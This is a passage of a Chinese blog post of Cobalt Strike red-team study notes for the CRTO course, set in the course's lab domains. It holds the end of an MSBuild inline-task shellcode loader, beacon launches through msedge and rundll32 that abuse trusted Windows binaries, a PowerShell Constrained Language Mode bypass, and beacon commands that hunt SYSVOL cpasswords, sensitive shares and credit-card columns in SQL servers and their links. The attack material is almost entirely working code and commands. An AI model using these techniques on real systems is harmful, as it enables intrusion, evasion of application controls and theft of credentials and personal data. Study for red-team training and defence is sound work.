class="hljs-type">Ptr.Zero</span>, (<span class="hljs-type">uint</span>)<span class="hljs-type">shellcode.Length</span>, <span class="hljs-number">0</span><span class="hljs-type">x00001000</span> | <span class="hljs-number">0</span><span class="hljs-type">x00002000</span>, <span class="hljs-number">0</span><span class="hljs-type">x40</span>);<br>                    <span class="hljs-type">Marshal.Copy</span>(<span class="hljs-type">shellcode</span>, <span class="hljs-number">0</span>, <span class="hljs-type">hMemory</span>, <span class="hljs-type">shellcode.Length</span>);<br><br>                    <span class="hljs-type">var</span> <span class="hljs-type">t</span> = <span class="hljs-type">ct</span>(<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr.Zero</span>, <span class="hljs-number">0</span>, <span class="hljs-type">hMemory</span>, <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr.Zero</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr.Zero</span>);<br>                    <span class="hljs-type">WaitForSingleObject</span>(<span class="hljs-type">t</span>, <span class="hljs-number">0</span><span class="hljs-type">xFFFFFFFF</span>);<br><br>                    <span class="hljs-type">return</span> <span class="hljs-type">true</span>;<br>                &#125;<br><br>            [<span class="hljs-type">DllImport</span>(<span class="hljs-string">&quot;kernel32&quot;</span>, <span class="hljs-built_in">Char</span><span class="hljs-type">Set</span> = <span class="hljs-built_in">Char</span><span class="hljs-type">Set.Ansi</span>)]<br>            <span class="hljs-type">private</span> <span class="hljs-type">static</span> <span class="hljs-type">extern</span> <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">LoadLibrary</span>([<span class="hljs-type">MarshalAs</span>(<span class="hljs-type">UnmanagedType.LPStr</span>)]<span class="hljs-built_in">string</span> <span class="hljs-type">lpFileName</span>);<br>    <br>            [<span class="hljs-type">DllImport</span>(<span class="hljs-string">&quot;kernel32&quot;</span>, <span class="hljs-built_in">Char</span><span class="hljs-type">Set</span> = <span class="hljs-built_in">Char</span><span class="hljs-type">Set.Ansi</span>)]<br>            <span class="hljs-type">private</span> <span class="hljs-type">static</span> <span class="hljs-type">extern</span> <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">GetProcAddress</span>(<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">hModule</span>, <span class="hljs-built_in">string</span> <span class="hljs-type">procName</span>);<br><br>            [<span class="hljs-type">DllImport</span>(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>            <span class="hljs-type">private</span> <span class="hljs-type">static</span> <span class="hljs-type">extern</span> <span class="hljs-type">uint</span> <span class="hljs-type">WaitForSingleObject</span>(<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">hHandle</span>, <span class="hljs-type">uint</span> <span class="hljs-type">dwMilliseconds</span>);<br><br>            [<span class="hljs-type">UnmanagedFunctionPointer</span>(<span class="hljs-type">CallingConvention.StdCall</span>)]<br>            <span class="hljs-type">private</span> <span class="hljs-type">delegate</span> <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">AllocateVirtualMemory</span>(<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">lpAddress</span>, <span class="hljs-type">uint</span> <span class="hljs-type">dwSize</span>, <span class="hljs-type">uint</span> <span class="hljs-type">flAllocationType</span>, <span class="hljs-type">uint</span> <span class="hljs-type">flProtect</span>);<br>    <br>            [<span class="hljs-type">UnmanagedFunctionPointer</span>(<span class="hljs-type">CallingConvention.StdCall</span>)]<br>            <span class="hljs-type">private</span> <span class="hljs-type">delegate</span> <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">CreateThread</span>(<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">lpThreadAttributes</span>, <span class="hljs-type">uint</span> <span class="hljs-type">dwStackSize</span>, <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">lpStartAddress</span>, <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">lpParameter</span>, <span class="hljs-type">uint</span> <span class="hljs-type">dwCreationFlags</span>, <span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span> <span class="hljs-type">lpThreadId</span>);<br><br>            &#125;<br><br>        ]]&gt;<br>      &lt;/Code&gt;<br>    &lt;/Task&gt;<br>  &lt;/UsingTask&gt;<br>&lt;/Project&gt;<br><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><span class="hljs-comment">## Other LOLBAS Binaries that can be used to execute code can be found below</span><br><span class="hljs-comment"># LOLBAS Project - https://lolbas-project.github.io/#/execute</span><br><br><span class="hljs-comment">## Using MsEdge.exe to execute beacon ( it will pop a window which will be visible to user, To avoid that we can use --headless msedge)</span><br><span class="hljs-string">&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe&quot;</span> <span class="hljs-literal">--disable-gpu-sandbox</span> <span class="hljs-literal">--gpu-launcher</span>=<span class="hljs-string">&quot;C:\Windows\Tasks\smb3_x64.exe &amp;&amp;&quot;</span><br><span class="hljs-string">&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe&quot;</span> <span class="hljs-literal">--headless</span> <span class="hljs-literal">--disable-gpu-sandbox</span> <span class="hljs-literal">--gpu-launcher</span>=<span class="hljs-string">&quot;C:\Windows\Tasks\smb3_x64.exe &amp;&amp;&quot;</span><br><span class="hljs-comment">## Powershell Contrained Language Mode</span><br><br><span class="hljs-comment"># 1. Break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace</span><br>beacon&gt; powershell <span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode<br>ConstrainedLanguage<br><br>beacon&gt; powerpick <span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode<br>FullLanguage<br><span class="hljs-comment"># 2. We can also achieve the FullLanguage Mode using the LOLBAS, For that we can use the C# loader which can execute a powershell commands. And then add it to a .csproj or .xml file, and execute this using msbuild.exe.</span><br>C:\Windows\Microsoft.Net\Framework64\v4.<span class="hljs-number">0.30319</span>\MSBuild.exe test.csproj<br><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><br><span class="hljs-comment">## Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)</span><br><br><span class="hljs-comment"># DLL enforcement is not commonly enabled which allows us to call exported functions from DLLs on disk via rundll32.</span><br><span class="hljs-comment"># Beacon&#x27;s DLL payload exposes several exports including DllMain and StartW.  These can be changed in the Artifact Kit under src-main, dllmain.def.</span><br>C:\Windows\System32\rundll32.exe http_x64.dll,StartW<br></code></pre></td></tr></table></figure>

<h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Enumerate Share</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-ShareFinder</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-FileFinder</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-FileNetServer</span><br>beacon&gt; shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml<br>beacon&gt; <span class="hljs-built_in">Get-DecryptedCpassword</span><br><br><span class="hljs-comment"># Find accessible share having juicy information</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-DomainShare</span> <span class="hljs-literal">-CheckShareAccess</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-InterestingDomainShareFile</span> <span class="hljs-literal">-Include</span> *.doc*, *.xls*, *.csv, *.ppt*<br>beacon&gt; powerpick <span class="hljs-built_in">gc</span> \\fs.dev.cyberbotic.io\finance<span class="hljs-variable">$</span>\export.csv | <span class="hljs-built_in">select</span> <span class="hljs-literal">-first</span> <span class="hljs-number">5</span><br><br><span class="hljs-comment"># Search for senstive data in directly accessible DB by keywords</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLInstanceDomain</span> | <span class="hljs-built_in">Get-SQLConnectionTest</span> | ? &#123; <span class="hljs-variable">$_</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Accessible&quot;</span> &#125; | <span class="hljs-built_in">Get-SQLColumnSampleDataThreaded</span> <span class="hljs-literal">-Keywords</span> <span class="hljs-string">&quot;email,address,credit,card&quot;</span> <span class="hljs-literal">-SampleSize</span> <span class="hljs-number">5</span> | <span class="hljs-built_in">select</span> instance, database, column, sample | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-autosize</span><br><br><span class="hljs-comment"># Search for senstive data in DB links</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;select * from openquery(&quot;</span><span class="hljs-string">&quot;sql-1.cyberbotic.io&quot;</span><span class="hljs-string">&quot;, &#x27;select * from information_schema.tables&#x27;)&quot;</span><br><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;select * from openquery(&quot;</span><span class="hljs-string">&quot;sql-1.cyberbotic.io&quot;</span><span class="hljs-string">&quot;, &#x27;select column_name from master.information_schema.columns where table_name=&#x27;&#x27;employees&#x27;&#x27;&#x27;)&quot;</span><br><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;select * from openquery(&quot;</span><span class="hljs-string">&quot;sql-1.cyberbotic.io&quot;</span><span class="hljs-string">&quot;, &#x27;select top 5 first_name,gender,sort_code from master.dbo.employees&#x27;)&quot;</span><br><span class="hljs-comment"># Not able to migrate to another process using Inject Command (worked by choosing P2P </span><br>beacon)<br><br><span class="hljs-comment"># Was facing some issues with doing the lateral movement by SYSTEM User</span><br>- But <span class="hljs-keyword">if</span> we have access to NTLM hash, we can directly use PTH and JUMP to <span class="hljs-built_in">move</span> laterally <br>- Still Powerview functions don<span class="hljs-string">&#x27;t work in this context, need to find a way</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Cobalt-Strike/" class="print-no-link">#Cobalt Strike</a>
      
        <a href="/tags/CRTO/" class="print-no-link">#CRTO</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CRTO - 红队指挥备忘单 (Cobalt Strike) - 2024</div>
      <div>https://sh1yan.top/2025/04/01/Certified-Red-Team-Operator-(CRTO)-Notes/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年4月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/10/13/Union-htb-writeup/" title="Union-htb-writeup">
                        <span class="hidden-mobile">Union-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
